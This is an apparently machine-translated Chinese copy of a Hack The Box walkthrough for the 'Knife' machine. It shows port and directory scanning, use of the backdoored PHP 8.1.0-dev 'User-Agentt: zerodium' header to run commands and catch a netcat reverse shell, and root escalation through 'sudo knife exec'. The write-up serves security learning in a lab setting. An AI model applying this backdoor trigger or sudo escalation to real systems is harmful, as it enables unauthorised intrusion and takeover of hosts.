cms sudo


# 0xdf黑客的东西

[0xdf.gitlab.io](https://0xdf.gitlab.io/2021/08/28/htb-knife.html)0xdf黑客的东西

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fknife-cover.) 

刀是HTB上更容易的盒子之一，但它也是一个自发布以来变得更容易的盒子。我将从一个Web服务器开始，该Web服务器没有托管太多站点，但泄露它正在运行PHP的开发版本。此版本恰好是 PHP 开发服务器在 2021 年 3 月被黑客入侵时插入后门的版本。在发布时，只是搜索这个版本字符串并没有立即导致后门，但在发布后的两天内确实如此。对于根，用户可以以根为根运行刀。在发布时，没有刀子的go awaybins页面，因此挑战需要阅读文档以找到运行任意代码的方法。该页面现在已存在。


## 侦察

### n地图

`nmap`找到两个打开的 TCP 端口，即固态混合端口 （22） 和 HTTP （80）：

    oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.242
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-22 15:11 EDT
    Nmap scan report for 10.10.10.242
    Host is up (0.022s latency).
    Not shown: 65533 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    
    Nmap done: 1 IP address (1 host up) scanned in 11.25 seconds
    
    oxdf@parrot$ nmap -p 22,80 -sCV -oA scans/nmap-tcpscripts 10.10.10.242
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-22 15:11 EDT
    Nmap scan report for 10.10.10.242
    Host is up (0.018s latency).
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
    |   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
    |_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
    80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    |_http-title:  Emergent Medical Idea
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 7.39 seconds
    

根据[开放SSH](https://packages.ubuntu.com/search?keywords=openssh-server)和[阿帕奇](https://packages.ubuntu.com/search?keywords=apache2)版本，主机可能正在运行Ubuntu 20.04 Focal。

### 网站 - TCP 80

#### 网站

该网站适用于医疗团体：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210522152825884.png) 

这就是整个页面。页面上没有任何可与之交互的内容。

#### 技术堆栈

我可以对页面进行一些猜测，并且似乎加载了相同的页面，因此可以安全地假设该网站是基于PHP的。响应标头确认了这一点：`/``index.php`

    HTTP/1.1 200 OK
    Date: Sat, 22 May 2021 19:30:15 GMT
    Server: Apache/2.4.41 (Ubuntu)
    X-Powered-By: PHP/8.1.0-dev
    Vary: Accept-Encoding
    Content-Length: 5815
    Connection: close
    Content-Type: text/html; charset=UTF-8
    

PHP版本在这里很重要。PHP报告这样的版本并不罕见。

#### 目录暴力破解

我将与该网站运行：`feroxbuuster`

    oxdf@parrot$ feroxbuster -u http://10.10.10.242 -o scans/ferozbuster-root-php
    
     ___  ___  __   __     __      __         __   ___
    |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
    |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
    by Ben "epi" Risher 🤓                 ver: 2.2.1
    ───────────────────────────┬──────────────────────
     🎯  Target Url            │ http://10.10.10.242
     🚀  Threads               │ 50
     📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
     👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
     💥  Timeout (secs)        │ 7
     🦡  User-Agent            │ feroxbuster/2.2.1
     💉  Config File           │ /etc/feroxbuster/ferox-config.toml
     💾  Output File           │ scans/ferozbuster-root-php
     🔃  Recursion Depth       │ 4
     🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
    ───────────────────────────┴──────────────────────
     🏁  Press [ENTER] to use the Scan Cancel Menu™
    ──────────────────────────────────────────────────
    403        9l       28w      277c http://10.10.10.242/server-status
    [####################] - 15s    29999/29999   0s      found:1       errors:0      
    [####################] - 15s    29999/29999   1974/s  http://10.10.10.242
    

有一个页面，但没什么有趣的。`/server-status`

## 谢尔 饰 詹姆斯

### 查找漏洞利用

该标头提供了一个非常具体的 PHP 版本，即 PHP/8.1.0 开发版。对新闻的一些了解提醒我，PHP源代码存储库存在一个问题，它被黑客入侵并插入了后门（[ref1](https://arstechnica.com/gadgets/2021/03/hackers-backdoor-php-source-code-after-breaching-internal-git-server/)，[ref2](https://www.welivesecurity.com/2021/03/30/backdoor-php-source-code-git-server-breach/)，更多）。`X-Powered-By`

有点令人惊讶的是，在发布当天，谷歌搜索这个版本并没有找到关于这个后门的新闻报道，所以花了更多的研究才弄清楚这个版本是与后门相关的版本。也就是说，在Seak发布两天后，谷歌的顶部链接提到了后门：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210524091617210.png) 

今天，在发布三个月后，它填满了第一页，包括来自漏洞利用数据库和带有漏洞利用脚本的数据包的链接。

### 后门细节

由于GitHub和开源的工作原理，我可以直接查看[将此后门添加到](https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d)PHP代码库中的提交。提交将更改一个文件 ，添加 11 行代码（全部为绿色）：`ext/zlib/zlib.c`

[![image-20210827112703573](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210827112703573.png)_点击查看全尺寸图片_](https://0xdf.gitlab.io/img/image-20210827112703573.png)

看到其他人评论提交，第一条评论询问as的拼写错误是否是一个错误，四行后有人问它做了什么，其他人基本上回应说这是一个后门，以及它是如何工作的，这很有趣。`HTTP_USER_AGENT``HTTP_USER_AGENTT`

正如开发人员所指出的，要执行此后门程序，我需要一个以“zerodium”开头的标头，之后的任何内容都将作为PHP代码执行。`User-Agentt`

### 断续器

为了测试这一点，我将GET请求发送到Burp中继器，并将标头替换为恶意标头：`User-Agent`

[![image-20210522154141823](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210522154141823.png)_点击查看全尺寸图片_](https://0xdf.gitlab.io/img/image-20210522154141823.png)

它运行，结果位于响应的顶部。`system("id")`

### 壳

我将用反向 shell 替换它，然后再次运行它。`id`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210522154302972.png) 

响应只是挂起，但在 ，我有一个 shell：`nc`

    oxdf@parrot$ nc -lnvp 443
    listening on [any] 443 ...
    connect to [10.10.14.15] from (UNKNOWN) [10.10.10.242] 55806
    bash: cannot set terminal process group (933): Inappropriate ioctl for device
    bash: no job control in this shell
    james@knife:/$ 
    

我将使用常规技巧进行升级：

    james@knife:/$ python3 -c 'import pty;pty.spawn("bash")'
    python3 -c 'import pty;pty.spawn("bash")'
    james@knife:/$ ^Z
    [1]+  Stopped                 nc -lnvp 443 
    oxdf@parrot$ stty raw -echo ; fg
    nc -lnvp 443
                reset
    reset: unknown terminal type unknown
    Terminal type? screen
    james@knife:/$ 
    

并抓住用户标志：

    james@knife:~$ cat user.txt
    77834514************************
    

## 外壳作为根

### 列举

当尝试在 Linux 上升级时，请始终检查：`sudo -l`

    james@knife:~$ sudo -l
    Matching Defaults entries for james on knife:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User james may run the following commands on knife:
        (root) NOPASSWD: /usr/bin/knife
    

詹姆斯可以作为根运行。`knife`

### 背景

[Chef](https://docs.chef.io/platform_overview/) 是一个自动化/基础架构平台：

> Chef Infra 是一个功能强大的自动化平台，可将基础架构转换为代码。无论您是在云中、本地还是在混合环境中运营，Chef Infra 都能自动完成整个网络中基础架构的配置、部署和管理方式，无论其规模如何。

`knife`是一个命令行工具管理厨师。根据[文档](https://docs.chef.io/workstation/knife/)，它管理 Chef 的各个方面，例如：

> *   节点
> *   食谱和食谱
> *   角色、环境和数据包
> *   各种云环境中的资源
> *   将 Chef 基础设施客户端安装到节点上
> *   在 Chef 基础设施服务器上搜索索引数据

### 壳

虽然go awaybins有一个[刀的页面](https://gtfobins.github.io/gtfobins/knife/)，但当刀发布时却没有，让我梳理文档。有几种方法可以通过 执行。我将展示两个。`knife`

#### 维姆逃生

跑步将在以下位置打开一个新包：`knife data bag create 0xdf output -e vim``vim`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210522155041425.png) 

我将通过以下方式逃避vim：`:!/bin/bash`

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210522155109446.png) 

#### 执行

更简单地说，有一个[命令](https://docs.chef.io/workstation/knife_exec/)将运行Ruby代码。这是现在在走开的技巧，但是当刀子发布时，它就不存在了。[Ruby上有一个走开页面](https://gtfobins.github.io/gtfobins/ruby/#sudo)，显示正在运行。那里的红宝石代码是 .在这里使用相同的 Ruby 代码是有效的：`knife``exec``sudo ruby -e 'exec "/bin/sh"'``exec "/bin/sh"`

    james@knife:~$ sudo knife exec -E "exec '/bin/bash'"         
    root@knife:/home/james#
    

这个实际上很酷，因为我可以通过PHP vuln运行它，并在一个命令中获取两个标志：

 ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2F0xdf.gitlab.io%2Fimg%2Fimage-20210523065600707.png) 

[查看原网页: 0xdf.gitlab.io](https://0xdf.gitlab.io/2021/08/28/htb-knife.html)